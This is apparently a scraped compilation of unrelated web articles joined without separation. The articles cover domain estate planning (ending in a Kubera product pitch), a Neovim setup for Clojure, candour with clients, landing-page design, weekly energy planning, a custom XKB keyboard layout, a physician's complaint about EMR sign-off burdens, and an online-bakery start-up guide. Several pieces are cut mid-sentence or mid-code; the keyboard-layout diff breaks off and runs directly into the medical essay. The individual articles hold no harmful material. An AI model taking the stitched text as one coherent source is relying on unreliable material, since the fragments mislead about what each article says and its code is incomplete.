are.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/alexander-b-kim.JPG 300w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/alexander-b-kim.JPG 460w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/alexander-b-kim.JPG 620w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/alexander-b-kim.JPG 780w,https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/alexander-b-kim.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5344999.1572636662!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/alexander-b-kim.JPG"></p></div><figcaption>Alexander Kim is a journalist and radio producer based in Vancouver.<!-- --> <!-- -->(Submitted by Alexander B.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even experienced domainers may not know the name Igal Lichtman. The legendary domain investor was better known by his business name, Mrs Jello.<br></p><p>Over a career spanning decades, Lichtman acquired a vast portfolio of investment domains, many worth tens of thousands of dollars. But it was what happened after Lichtman passed away in 2013 that should serve as a cautionary tale to <em>all</em> domainers.</p><h2>What Happens to Your Domains When You Die?<br></h2><p>What happens to your domains <a href="https://www.kubera.com/blog/what-important-financial-information-should-my-family-know">when you die</a> depends on how you prepare for the inevitable.</p><p>In Lichtman’s case, there wasn’t nearly enough preparation, if any. When Lichtman died from cancer complications in February of 2013, his family was left with the difficult task of trying to organize and gain access to his vast portfolio of investment domains.<br></p><p>But as his family learned, Lichtman hadn’t created a clear path for his beneficiaries to take ownership of his domains. As they expired, they were <a href="https://www.thedomains.com/2013/02/22/after-75k-in-lost-domains-igal-in-death-teaches-us-we-need-an-after-life-plan/" target="_blank">auctioned off by their registrars</a>.&nbsp;<br></p><p>The same month that Lichtman died, Vodka.net sold for $20,000. Penis.net was auctioned for $5,015. And in one of the biggest sales from Lichtman’s portfolio, Vegans.com sold for $48,000.<br></p><p>This is all money that could have gone to Lichtman’s beneficiaries. They could have kept those domains as investments, or sold them for an immediate payout for Lichtman’s family. Instead, those big payouts went to the domain registrars and auction companies that facilitated the sales.<br></p><h2>What Happened To Igal Lichtman Could Happen To Anyone<br></h2><p>Igal Lichtman made a career out of investing in domains, so his death (and the subsequent loss of his entire portfolio) made waves in the domainer world.<br></p><p>But this isn’t something that only happens to professional domain investors.<br></p><p>Jane Both, a lifelong entrepreneur from Milford, Pennsylvania, was just 50 years old when she <a href="https://www.recordonline.com/article/20170331/obituaries/303319989" target="_blank">died suddenly</a> while walking her dogs in her neighborhood in late March of 2017. Both was involved in all kinds of business ventures, including Streamline Management of Port Jervis, a home inspection service. But she was also savvy when it came to domain investing. In 2013, long before many people were considering the potential of blockchain domains, Both was buying as many as she could find.<br></p><p>Her portfolio eventually consisted of more than 100 domains containing the “blockchain” keyword — including appealing domains like BlockchainManagement.com, BlockchainAssets.com, BlockchainFinance.com, BlockchainPro.com, and BlockchainTools.com.<br></p><p>But you can probably guess where this story is going. Like Lichtman, Both didn’t plan for what would happen to her domains after her death. And so, in 2018, they <a href="https://www.thedomains.com/2018/01/18/100-expiring-blockchain-domain-auctions-next-5-days/" target="_blank">began to expire and head to auction.</a><br></p><figure id="w-node-eb256527c8e9-ac468d02"><p><img src="https://uploads-ssl.webflow.com/5ded36b5e942e74b13468d23/5f32b6a8e3394406d2d74bf9_01-Image%402x.png" alt="what happens to your domains when you die"></p></figure><p>Of the more than 100 blockchain domains Both owned, many sold for thousands of dollars, and many more for hundreds. In all, her beneficiaries missed out on tens of thousands of dollars that resulted from the sale of all of Both’s domains — money that should have gone to her loved ones, but instead went to registrars and auction companies.<br></p><h2>It’s Time to Treat Domains Like Any Other Wealth Asset<br></h2><p>These stories make one thing clear: Whether you purchase domains for the express purpose of investing in them, or just own the domains for your business or personal websites, domains can be valuable and sentimental, and they should be treated like any other digital wealth asset. In the digital age, anyone who owns a domain needs a plan in place for someone to take ownership of and manage it after their death.<br></p><p>Most domain registrars have a process in place for when an account owner dies. For example, GoDaddy, one of the world’s largest domain registrars, <a href="https://www.godaddy.com/help/how-to-gain-access-to-domainsaccounts-after-owners-death-8356" target="_blank">outlines steps</a> for what to do and how to gain access to domains or accounts after their owner’s death.<br></p><p>But even when a registrar has a process in place, it can be complicated for beneficiaries who aren’t well versed in domains and digital assets. And then there’s the question of whether your beneficiaries will even <em>know</em> what domains you own, whether they have value, and how to seek access to them.<br></p><p>You can’t leave this process to chance, or just assume that your beneficiaries will know to follow your registrar’s steps to take control of your domains. You have to be proactive to protect your domain investments.<br></p><h2>How to Protect Your Domain Investments: Step By Step<br></h2><p>Ready to make sure your domains are protected in case of the worst? Here’s what you need to do.<br></p><h3>Create a Digital Inventory<br></h3><p>We rarely think about how many online accounts we create all the time. From social media, to streaming sites and Spotify, ecommerce sites, food delivery, and, of course, our domains — there are <em>tons</em> of sites that have our personal information and, oftentimes, payment information stored. Making sure your beneficiaries have access to all these accounts will greatly simplify the process of organizing and closing them after your death.<br></p><p>That’s why, for domains, but also <em>all</em> other digital assets and accounts, <a href="https://www.kubera.com/blog/using-excel-or-google-sheets-for-tracking-net-worth">everyone should have a digital inventory</a>. This should include every account you own, passwords, associated phone numbers and email addresses, and, for any accounts that require payments or renewals, the dates and costs for renewal.<br></p><p>Your digital inventory should be available <a href="https://www.kubera.com/blog/which-important-financial-documents-should-you-safekeep">both online and offline</a> (like in a safe deposit box that a trusted beneficiary can access) and should be updated regularly.<br></p><h3>Write a Digital Will<br></h3><p>If you’re a sole trader or proprietor, your business assets, including domains and other digital assets, are legally indistinguishable from you, and would be distributed <a href="https://www.kubera.com/blog/wills-trusts-and-estate-planning-not-enough-to-protect-wealth">according to your will</a>.<br></p><p>However, it’s becoming a more common practice for people who hold a variety of digital wealth assets to write a digital will, specifying exactly how they want things like their domains passed on after their death. It’s also becoming a more common practice to name a digital executor for that will — someone who has the knowledge and experience to ensure that digital assets are transferred safely and correctly.<br></p><h3>Use a Portfolio Manager That’s Made for the Digital Age<br></h3><p>It’s long been standard practice to use a portfolio manager for tracking net worth and organizing investments in one place — a good practice that makes them easier to distribute after you’re gone.<br></p><p>But as we move forward in the digital age, wealth and investments are becoming more complex, and most traditional portfolio managers aren’t up to the task of <a href="https://www.kubera.com/blog/portfolio-manager-to-track-fiat-currency-crypto-portfolios">tracking digital wealth like crypto wallets, multi-currency accounts, and domains</a>. That’s why you need a portfolio manager that’s made for the digital age. That’s why <a href="https://www.kubera.com/">you need Kubera</a>.<br></p><p>Not only does Kubera allow you to track <em>all</em> your wealth assets — from the traditional, like stocks, bonds, bank accounts, cash, and real estate, to the modern, like collectibles, crypto exchanges and wallets, domains, and other digital assets.

August 25, 2020 | https://tomekw.com/nvim-for-clojure-development/ | <a href="https://web.archive.org/web/*/https://tomekw.com/nvim-for-clojure-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Everything you need to write Clojure using (N)vim.</p>

<p>I used different editors and IDEs over the years: Netbeans, Vim, Emacs, and IntelliJ.
And on all of them, I always enabled Vim keybindings.</p>

<p>Few months ago, after more than 10 years writing Ruby, I started my first commercial
role as a Clojure Software Engineer at <a href="https://commsor.com/">Commsor</a>! I’m lazy,
so I picked <a href="https://cursive-ide.com/">Cursive IDE</a> (which is great BTW!), with IdeaVim
plugin enabled. Everything worked out of the box, but after while I, obviously, started to envy
my colleagues their custom workflows and setups…</p>

<p>Now that I’m sure I am Vim person to the bone - why not to give it a go? I decided to configure
a pretty minimal, as close to the Vim philosophy, setup as possible. Here it is!</p>

<h3 id="choosing-vim-distribution">Choosing Vim distribution</h3>

<p>I’m on MacOS, so I could either use <a href="https://macvim-dev.github.io/macvim">MacVim</a> distribution,
console <a href="https://neovim.io/">nvim</a>, or some GUI client for it. I decided to try out
<a href="https://github.com/qvacua/vimr">VimR</a> and I’m not disappointed:</p>



<h3 id="essential-plugins">Essential plugins</h3>

<p>I decided to manage my plugin dependencies with <a href="https://github.com/junegunn/vim-plug">vim-plug</a>.
It keeps the configuration file small and readable, and just gets the job done:</p>

<div><div><pre><code><span>" ~/.config/nvim/init.vim</span>

<span>call</span> plug#begin<span>()</span>

<span>" Plugins to install</span>
Plug <span>'first/plugin-vim'</span>
Plug <span>'second/plugin-vim'</span>

<span>call</span> plug#end<span>()</span>

<span>" Rest to the configuation file</span>
<span>" ...</span>
</code></pre></div></div>

<p>To install them we can reloaded the current file (<code>~/.config/nvim/init.vim</code>) with <code>:so %</code>
and run <code>:PlugInstall</code>.</p>

<p>I started by including:</p>

<div><div><pre><code>Plug <span>'tpope/vim-sensible'</span>
Plug <span>'vim-airline/vim-airline'</span>
</code></pre></div></div>

<p>which provide universal set of defaults and a lean status line.</p>

<p>For file and project management I picked <a href="https://github.com/ctrlpvim/ctrlp.vim">ctrlp.vim</a>:</p>

<div><div><pre><code>Plug <span>'ctrlpvim/ctrlp.vim'</span>
</code></pre></div></div>

<p>The only custom configuration I added was setting up additional project root marker and a different
user command to list files based on Git index:</p>

<div><div><pre><code><span>let</span> <span>g:ctrlp_root_markers</span> <span>=</span> <span>[</span><span>'deps.edn'</span><span>]</span>
<span>let</span> <span>g:ctrlp_user_command</span> <span>=</span> <span>[</span><span>'.git'</span><span>,</span> <span>'cd %s &amp;&amp; git ls-files -co --exclude-standard'</span><span>]</span>
</code></pre></div></div>

<p>Also, I chose Apprentice as my color scheme:</p>

<div><div><pre><code>Plug <span>'romainl/Apprentice'</span>

<span>colorscheme</span> apprentice
</code></pre></div></div>

<p>Mandatory screenshot:</p>

<p><img src="https://tomekw.com/assets/images/apprentice.png" alt="Apprentice"></p>

<p>The must-have plugin for everyone is:</p>

<div><div><pre><code>Plug <span>'axelf4/vim-strip-trailing-whitespace'</span>
</code></pre></div></div>

<p>which removes trailing whitespace on modified lines before saving.</p>

<p>Last but not least there is support for searching across the files in the project.
<a href="https://github.com/mileszs/ack.vim">ack.vim</a> supported
by <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> works perfectly!
Importantly, it takes <code>.gitignore</code> settings into account.</p>



<p>and</p>



<p>Custom configuration sets the ripgrep as a backend, closes the search results popup after choosing
the result, and stops the plugin from jumping to the first result automatically.</p>

<div><div><pre><code><span>let</span> <span>g:ackprg</span> <span>=</span> <span>'rg --vimgrep'</span>
<span>let</span> <span>g:ack_autoclose</span> <span>=</span> <span>1</span>
cnoreabbrev Ack Ack<span>!</span>
</code></pre></div></div>

<p>All of that alone would be a potent general-purpose Vim setup.</p>

<h3 id="clojure-support">Clojure support</h3>

<p>To efficiently write Clojure code I needed syntax highlighting, structural editing
support, REPL management, and context-aware autocomplete.</p>

<p>These three plugins:</p>

<div><div><pre><code>Plug <span>'guns/vim-clojure-highlight'</span>
Plug <span>'guns/vim-clojure-static'</span>
Plug <span>'luochen1990/rainbow'</span>
</code></pre></div></div>

<p>give me syntax highlighting, indentation, and rainbow parentheses to better distinguish forms
visually.</p>

<p>Next two plugins:</p>

<div><div><pre><code>Plug <span>'guns/vim-sexp'</span>
Plug <span>'tpope/vim-sexp-mappings-for-regular-people'</span>
</code></pre></div></div>

<p>provide structural editing support with vim-like mappings.</p>

<p>These five:</p>

<div><div><pre><code>Plug <span>'clojure-vim/vim-jack-in'</span>
Plug <span>'radenling/vim-dispatch-neovim'</span>
Plug <span>'SevereOverfl0w/vim-replant'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>':UpdateRemotePlugins'</span> <span>}</span>
Plug <span>'tpope/vim-dispatch'</span>
Plug <span>'tpope/vim-fireplace'</span>

</code></pre></div></div>

<p>allow me to start and / or connect to existing nREPL session, with <code>deps.edn</code> support
by just invoking:</p>



<p><code>vim-replant</code> adds handy keybindings for working with Clojure REPLs. Just invoke
<code>&lt;LocalLeader&gt;rf</code> to refresh namespaces by automatically calling your common <code>(stop)</code>/<code>(start)</code>
functions! Magic!</p>

<p>And you know what? All of this doesn’t need a single line of custom configuration.
I love the sane defaults and conventions!</p>

<p>Context-aware autocomplete needs more work, but it’s worth the effort.</p>

<div><div><pre><code>Plug <span>'clojure-vim/async-clj-omni'</span>
Plug <span>'prabirshrestha/asyncomplete.vim'</span>
</code></pre></div></div>

<p>These two plugins provide autocomplete which understands your code by using the existing REPL
connection! <code>asyncomplete</code> doesn’t come with any sources enabled and it needs to be registered:</p>

<div><div><pre><code><span>au</span> <span>User</span> asyncomplete_setup <span>call</span> asyncomplete#register_source<span>({</span>
<span>    \</span> <span>'name'</span><span>:</span> <span>'async_clj_omni'</span><span>,</span>
<span>    \</span> <span>'whitelist'</span><span>:</span> <span>[</span><span>'clojure'</span><span>],</span>
<span>    \</span> <span>'completor'</span><span>:</span> <span>function</span><span>(</span><span>'async_clj_omni#sources#complete'</span><span>),</span>
<span>    \</span> <span>})</span>
</code></pre></div></div>

<p>And that’s all! It’s ready to help you keep all the parentheses balanced :)</p>

<p>The complete configuration file, with few additional plugins, can be found on my
<a href="https://github.com/tomekw/dontfiles/blob/master/.config/nvim/init.vim">tomekw/dontfiles</a> repo.
I’m sure the current setup will grow in the future, but you can track the progress by following
me on <a href="https://twitter.com/_tomekw">Twitter</a>!</p>

<p>Once upon a time, I was working on a project that was going pretty well until it wasn’t. Our full time DevOps person suddenly quit and we were struggling to find a replacement, so builds were getting flakier by the day. Plus, the frontend work had slowed to a trickle because one dev had to start splitting time with another project, and the other dev was still ramping up. </p>



<p>That’s what we saw, and it sucked but it was understandable. These things happen.</p>



<p>But what did the client see? <strong>Slow progress</strong>. That’s all they got, because we didn’t tell them about any of our staffing issues. Clients gonna client, so their natural reaction was to panic that work wasn’t getting done and start making wild guesses about why, most of which involved some form of them getting screwed or the team not understanding how important this all is. </p>



<p>We had turned 1 problem (staffing issues) into 2 problems (staffing issues and a thrashing client). Abracadabra!</p>



<hr>



<p>Why do we do this to ourselves and our clients? Why do we try to hide our problems? Because it’s embarrassing that we’re struggling with staffing? Because we don’t want to admit that we don’t know technology X as deeply as we thought? Because we want to be professional, and professionals don’t have problems? Because we don’t want to upset them?</p>



<p>If we want to be professional, then we need to be transparent and say the embarrassing thing. If we want to avoid upsetting them, then we should tell them what’s going on instead of making them guess. <em>Their guesses are usually more upsetting than the truth</em>. </p>



<p>The book <em>Joy Inc</em>. by Richard Sheridan talks a lot about aligning the world’s outside perception of your company with your inside reality: “The message felt quite freeing, because it meant you didn’t have to lie to anybody about anything.” </p>



<p>That’s what we’re doing when we hide things from the client. We’re lying. How professional is that? How does that help anyone?</p>



<p>Stop that. Be radically candid with your clients. Bring them in. Don’t just show them the sausage making, but make the sausage with them instead of for them. That way, when the sausage machine goes haywire, the client can skip the thrashing and focus on the fixing.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  



  <p><img src="https://d33wubrfki0l68.cloudfront.net/e7b2e5a7c740261a93e10f899991c533f986e7f6/3e96c/uploads/landing-page-hacks.jpg" alt=""></p>

<p>The difference between a landing page and company website is simple: while the latter is an all-purpose website that people will access from your social media profile or general Google search, the landing serves a more specific purpose. It will usually be the endpoint of an ad campaign, may it be a social media banner campaign, a search ad campaign or even offline, through a special URL or QR code printed on a poster or magazine ad.</p>

<p>A landing page can be covering your whole product or be centered on one specific feature, problem or audience segment. In highly competitive spaces, a landing page can be used to compare your product against a popular competitor, trying to steal away their search traffic.</p>

<p>What all landing pages have in common is their purpose: They will try to convert a visitor into a paying customer – something that we call conversion design. To be successful with that, there is no cookie cutter formula: Every landing page is different, just as every product is different. If someone tries to tell you otherwise, they are probably trying to sell you their templated landing page builder.</p>

<p>However, there a few things that every successful landing page needs to have – regardless of content and design. At Human Deluxe, we have been creating a lot of landing pages – and these are the things that we learned on the way:</p>

<h2 id="1-simple-catchy-entry">1. Simple, Catchy Entry</h2>

<p>To eliminate one big myth first: There is no “fold” on a landing page. Trying to get all the seemingly important elements “above the fold” will make your header section messy and overcrowded. Instead, find a good, simple and catchy way to start your landing page: Start with a short and catchy title that draws attention and invests users emotionally in your product. If you use a visual, try making it simple and readable: A simplified screenshot of your app in a device frame works well, a playful illustration that sets the tone or even a simple moody stock photo that conveys an emotion. Same goes here: Do not overload users, but also make clear: There is more!</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/a39223ff2a1afa279eabc7d9ea82849a67ecd13f/20325/uploads/landing-page-avocode.jpeg" alt=""></p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/68a77217bcaf68643a6b1072aae8c6d7ccbb66db/b3613/uploads/landing-page-stripe.jpeg" alt=""></p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/cd4ed1751f7bd9975be54c7a2479a73cc05487fd/33786/uploads/landing-page-epicurrence.jpg" alt=""></p>

<h2 id="2-one-very-clear-call-to-action">2. One Very Clear Call to Action</h2>

<p>Speaking of conversion, think about what you want your visitors to do, and make it very clear for them. We call this: Call to Action. A call to action is not only a nice big button, but the whole context. Avoid generic texts like “Learn more …” or “Contact us”. Instead, try to manage expectations with your call to action, like:</p>

<ul>
  <li>Start your FREE 30 day trial</li>
  <li>Book a call with Katja</li>
</ul>

<p>For successful call to actions, the context is important: Make sure that your nice big button has enough white space around it to properly stand out. Provide information about what is going happen next or what is not going to happen. A simple hint like: “No credit card required” might be an amazing conversion driver, taking the fear of being ripped off of users.</p>

<h2 id="3-concrete-product-showcase">3. Concrete Product Showcase</h2>

<p>When your landing page is for a concrete product (and it usually is), make sure you show and explain it. Especially in B2B, landing pages often make the mistake of trying to stay too vague around what the user will get, excusing it with “it’s too complicated”, “it’s super individual” or “We will overhaul the whole thing”.</p>

<p>Explain features and requirements, show photos, screenshots or even videos. Take some time to do so – users love to see your actual product before they use it.</p>

<p>In best case, you will have a customised version of your product for the landing page that idealises and simplifies your product, showing demo data, focussed interfaces or even highlights the important sections.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7157128a6aaadd96d7c2acb6a43e91fd52580060/9a292/uploads/landing-page-product.jpeg" alt=""></p>

<h2 id="4-structured-information">4. Structured Information</h2>

<p>Think of all the questions that a visitor could have and try to answer them, in a simple and structured way. A good way to do this is a kind of FAQ section: Short questions, clear &amp; short answers. Don’t be afraid of being redundant: What you want to have here is an inclusive and accessible experience, where people get the information, even if they missed it in the first 3 placements.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/30e8345aa637bc3fbd72c97c1a73c91f9cfbd240/8e154/uploads/landing-page-faq.jpeg" alt=""></p>

<p>Structuring information in a simple and expected way helps users to consume it very quickly – don’t try to be too innovative here, this will rather scare people.</p>

<h2 id="5-show-your-face">5. Show your Face</h2>

<p>Lastly, show the team: Who is making the product? It may seem irrelevant to the product, but we Human beings tend to trust other more than we trust products or concepts. So in order to build an engaging, converting landing page – make sure that you are a part of it.</p>

<p>I hope these help you create or improve your own landing page. What other best practices do you have? Let me know on Twitter or Instagram: <a href="https://twitter.com/johannesippen">@johannesippen</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-reactid="8"><p>The beginning of the week is the worst.</p>
<p>And to be honest, it doesn’t feel any different from last week.</p>
<p>And the week before — <em>slow, boring, simply-looking-forward-to-Friday</em>.</p>
<h2>Dragging through a slow start</h2>
<p>For many, Monday is the least productive day and it comes with a lot of guilt that sets the tone for the rest of the week. </p>
<p>I see all over the internet, especially on LinkedIn, how you should start your week with so much enthusiasm. </p>
<blockquote>
<p><em>Yeah! New week! New me! New possibilities!”</em> </p>
</blockquote>
<p>Ummm maybe they’re unto something - good for them. But in reality, most Mondays feel like:</p>
<blockquote>
<p><em>New week! Ugh! It’s sooooo long until the weekend!</em></p>
</blockquote>
<p>Then it’s Tuesday. Same story.</p>
<p>I don’t know about you but this is usually the summary of many weekends for me:</p>
<ul>
<li>It was too short.</li>
<li>I had this feeling last week.</li>
<li>I had the same this week.</li>
<li>At this rate, I’ll have this feeling next week.</li>
</ul>
<h2>A potential solution</h2>
<p>I’ve been thinking a lot about this. </p>
<p>And recently found a breakdown by <a href="https://twitter.com/jeremiahdillon">Jeremiah Dillon</a>, previously Head of Product Marketing at Google for 9 years, to be super helpful.</p>
<p>At Google, Dillon <a href="https://www.fastcompany.com/3054571/the-better-time-management-strategy-this-googler-taught-his-coworkers">sent an email</a> that encouraged employees to set aside more time for <em>Maker Time — our creativity and thinking time —</em> instead of having endless busy times, back to back.</p>
<p>Here’s a <a href="https://www.youtube.com/watch?v=noc-DKZoNGU">2-minute video</a> on this concept.
<a href="https://www.youtube.com/watch?v=noc-DKZoNGU">

  </a>
    </p>
<p>In summary: first set aside more time for creativity by reducing the amount of busy times you have. Then align your days throughout the week with your energy level.</p>
<p><strong>Instead of fighting a lost battle with slow week starts, use Mondays to proactively plan your maker time and to align your energy level with tasks for the rest of the week.</strong></p>
<p>Make sense? </p>
<p>Now, don’t just make plans for planning sake. You want your plan to drive down busy time while also increasing maker time. </p>

    </span>
  </span>
  
  </a>
    
&nbsp; &nbsp; &nbsp; <em>The higher your busy time, the lower your maker time; but you can plan ahead more maker time by reducing your busy time.</em></p>
<h2>What the chart means</h2>
<p>The chart moves from 100% busy time to 100% maker time.</p>
<p>But 100% maker time is an idealistic state. We most likely will never get there. And that’s fine. I like to think of it as a form of stretch goal.</p>
<p>If you picture the top left corner of the graph, most of us reside there: <em>busy, exhausting, working on back-to-back tasks</em>.</p>
<p>A more realistic place to shoot for is somewhere, a little past the center where you’re still busy but you’ve set aside even more maker time. </p>
<p>Then on the far right is where you keep pushing yourself to, as you go more towards the right, it becomes much tougher to achieve 100%.</p>
<h2>Let’s look at a specific example</h2>
<p>Here’s a breakdown of an example week by Dillon:</p>
<p><strong>Monday</strong></p>
<p>Energy ramps out of the weekend — schedule low-demand tasks like setting goals, organizing, and planning.</p>
<p><strong>Tuesday, Wednesday</strong></p>
<p>Peak of energy — tackle the most difficult problems, write, brainstorm, schedule your Make Time.</p>
<p><strong>Thursday</strong></p>
<p>Energy begins to ebb — schedule meetings, especially when consensus is needed.</p>
<p><strong>Friday</strong></p>
<p>Lowest energy level — do open-ended work, long-term planning, and relationship building.”</p>
<h2>But I don’t manage anyone</h2>
<p>That’s ok. </p>
<p>You actually don’t have to be a manager to follow the high level principle. You don’t even have to work for a company.</p>
<p>You can adapt it for:</p>
<ul>
<li>
<p><strong>Workouts</strong>: Days where you want to do a full work out. Plan ahead something simple for days when you notice your energy is typically low</p>
</li>
<li>
<p><strong>Writing</strong>: You have a book to write but feel lazy in the evenings. You can use that period to plan titles for the book, outline for chapters, etc. But then dedicate your high energy in the mornings to writing at least one pages.</p>
</li>
<li>
<p><strong>Meditation/House Chores/Job application/etc</strong>: Plan ahead for low-energy moments.</p>
</li>
</ul>
<h2>Your next action</h2>
<p>Maybe for you, Mondays are not slow.</p>
<p>It could be Tuesday or Thursday.</p>
<p>The most important takeaway is that you should chunk your activities by different days of the week or different hours of the day and align them with your energy level.</p>
<p>That way, you’ll feel more balance and control in how your week goes.</p>
<p><strong>Remember, simple little actions everyday are what add up to the big transformation we all desire.</strong></p>
<p>The goal of this post is to push you to proactively remove barriers that will prevent you from starting a task in the future. By planning ahead simple tasks for when you feel lazy, you increase your chance of showing up everyday.</p>

<h2 id="insert-mode">Insert Mode<a href="#insert-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/insert_mode.jpg" alt="Insert Mode: A keyboard layout similar to normal QWERTYlayout"></p>
<h2 id="normal-mode">Normal Mode<a href="#normal-mode" arialabel="Anchor">⌗</a> </h2>
<p><img src="https://cedaei.com/images/normal_mode.jpg" alt="Normal Mode: A keyboard layout with the alphabet keys replaced with shortcutkey"></p>
<p>Inspired by vim, I wanted to create a layer on top of my keyboard which worked
like a shortcut layer. So, to start off, I found out about XKB<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. XKB is the
Xorg Keyboard Extension which tells Xorg on how to react to input from
keyboard.  After reading through some source code, I found out that Xorg has
support for function keys F1 - F35<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The general idea here was:</p>
<ul>
<li>Create an insert mode layout for text input.</li>
<li>Replace keys with relevant keys in normal mode (e.g. replace j with Down) and
for keys that require executing a command, replace then with a function key
above F12 (e.g. replace q with F13).</li>
<li>Bind all the function keys above F12 to the respective functions.</li>
</ul>
<p>To start off, I began a fresh Xorg session with nothing modifying the keys
(removed <code>xmodmap</code> from startup) and first dumped the current layout into a
file.</p>
<div><pre><code data-lang="bash">xkbcomp $DISPLAY ~/.xkb/insert.xkb
</code></pre></div><p>This was my starting point. I made changes to this file which were common to
both Insert and Normal mode. e.g. replaced <code>Caps Lock</code> with <code>Ctrl</code> and made
<code>Shift+Caps Lock</code> <code>Caps Lock</code>. Also, I unbound <code>Alt_R</code> as a modifier so that I
could use that as a switch between Normal and Insert Mode.</p>
<p>Here is a diff between the original layout and Insert mode.</p>
<pre><code>1323c1321
&lt;     key &lt;CAPS&gt; {         [       Caps_Lock ] };
---
&gt;     key &lt;CAPS&gt; {         [       Control_L,       Caps_Lock ] };
1551c1549
&lt;     modifier_map Lock { &lt;CAPS&gt; };
---
&gt;     modifier_map Control { &lt;CAPS&gt; };
1555d1552
&lt;     modifier_map Mod1 { &lt;RALT&gt; };
</code></pre><p>Next, I copied <code>~/.xkb/insert.xkb</code> to <code>~/.xkb/normal.xkb</code>. I replaced keys as
per the plan.</p>
<p>Here is a diff between Insert mode and Normal mode.</p>
<div><pre><code data-lang="diff">1200c1200

<p>By HANS DUVEFELT, MD</p>



<p>My Name is Doctor Bottleneck</p>



<p>Hello, my name is Doctor Bottleneck. My role is the opposite of a company CEO or a small business owner, even though I am clinically responsible for the care of my patients and the financial impact thereof.</p>



<p>In the business world, CEOs set policy and delegate tasks and responsibilities. They watch the big picture and get into the nitty gritty only if there seems to be a problem or a need for change because of new opportunities.</p>



<p>My role is to literally touch everything that happens to my patients, even if I’m not the doctor ordering a test or responsible for what to do with the result.</p>



<p>This, on paper (for those who still find that analogy relevant), sounds like a good idea: One medical professional maintaining an overview of each patient’s care. Theoretically that would seem to lead to better, more cost effective care.</p>



<p>Each primary care doctor is directly generating perhaps a million dollars in direct practice revenue. (This is only a guess, because I don’t know my own numbers or even an official average.) Then, with the new ways of counting actual cost per patient compared with a theoretical assumed baseline cost, we are more or less held responsible for the financial impact of clinical decisions made by other doctors far beyond our control. So, if we each have 1,500 patients with average annual health spending of $8,000, we could have something to do with $12,000,000 worth of healthcare decisions every year.</p>



<p>But there are two problems with this:</p>



<p>FIRST, doctors see patients all day long and generally have absolutely no time set aside in their schedules to read our own incoming test results or incoming specialist reports, answer questions or even refill prescriptions – all those things are done outside our patient schedules during uncompensated overtime.</p>



<p>What makes these duties even more cumbersome is that our current EMR “workflows” (an odd word for it really) require that absolutely everything that goes into each patient record is electronically signed off by the primary care physician. And given the current level of sophistication of our software, scrolling through a seven page discharge summary or consultation note that may contain medication changes or followup suggestions takes multiples of the time it used to take to do the same thing on paper. In addition, papers were often sorted by support staff and prioritized. In electronic records, the provider is the first and only person who sees anything that comes in. It is then up to us, again in spite of the clumsiness of our software and the lack of time for doing this work, to delegate followup actions to our support staff.</p>



<p>SECOND, doctors know almost nothing about the financial impact of everyday clinical decisions.</p>



<p>We are starting to be held responsible for the total cost of our patients’ care with little or no knowledge of what the real cost is of tests and procedures at the hospitals and specialist offices around us. This is a whole new area for us and I see little progress in spreading this kind of information to primary care providers. If anything, I see this as an emerging area of confusion and resentment between medical administrators and clinicians.</p>



<p>So, even though the world seems to need doctors to maintain a fairly detailed overview of the clinical and financial aspects of our patients’ total healthcare, the world severely underestimates how much time that takes – or should take, if we are going to do it right.</p>



<p>I think it’s high time we have a serious discussion about the best use of a doctor’s time. How many hours per week does it take to manage our patients’ healthcare and how much is that worth? How much time are we wasting right now on perfunctory electronic signatures? To what extent are we allowing workflows that feed the computer but suck the life blood and enthusiasm out of the medical providers who feed it what it wants without getting back from it what they need?</p>



<p>And I don’t like the name Doctor Bottleneck. </p>



<p>I want to be Doctor Real.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>If there is one thing that is certain in these uncertain times is that the current pandemic has forever changed how businesses operate.</p><p>It also changed how we shop. Right now, having an online bakery can be the answer to your questions on how to use your kitchen gifts to profit.</p><p>Starting a new business requires courage. But, if you got here, it shows that you are brave enough to put the idea into practice. So, roll up your sleeves and let’s get started. It’s time to work on your new online bakery.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ef0df6b9272f7410180a013/5f287bb0207e2c729c3793fb_University%20Application%20Process%20Infographic%20(1).jpg" alt="How to start an Online Bakery infographic _MightyForms"></p></figure><p>‍</p><p>These tips can work for a new business or if you are transferring your current bakery to an online store.</p><h2><strong>1. Write A Business Plan Specific for Your Online Bakery</strong></h2><p>Going online is easy. Getting results online, that’s a different story. But you can’t start anything without a proper plan first.&nbsp;</p><p>Having a detailed action plan will guide you every step of the way. It also helps you determine and learn to prioritize several important tasks that are part of having a business.&nbsp;</p><p>It doesn’t hurt to create a <a href="https://www.sba.gov/business-guide/plan-your-business/write-your-business-plan">lean business plan</a> at first since it allows you to be more flexible once you start your online bakery.</p><p>After careful review of the resources found in the U.S. Small Business Administration (SBA) website, we summed up how to write a business plan for an online bakery:</p><h3><strong>Value Proposition</strong></h3><p>Any business plan needs a value proposition. In a few words, you should be able to describe what goods you are going to offer. In a bakery case, it will be bread, cakes, donuts, sweets, and other kinds of cottage food. 